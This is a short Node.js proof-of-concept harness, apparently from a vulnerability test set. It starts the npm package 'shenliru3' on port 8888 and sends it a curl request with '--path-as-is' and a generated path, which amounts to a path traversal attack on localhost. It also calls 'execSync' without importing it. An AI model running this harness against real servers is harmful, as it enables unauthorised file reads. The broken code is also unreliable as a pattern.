function exploitFunction(payload) {
    const { genstr } = payload;  // Destructure the genstr function from the payload

    const { exec } = require("child_process");  // Import the required modules
    const { sleep } = require("sleep");

    // Clean up any previous processes
    try {
        execSync("fuser -k 8888/tcp");
    } catch (e) {}

    // Start the server
    let server = "node ./node_modules/shenliru3/index.js";
    exec(server, (error, stdout) => {});

    // Sleep to ensure the server starts
    sleep.sleep(2);

    // Craft the attack string
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;

    // Execute the attack
    exec(attack_string, (error, stdout) => {
        if (error) throw error;
        return stdout;
    });
}

module.exports = { exploitFunction };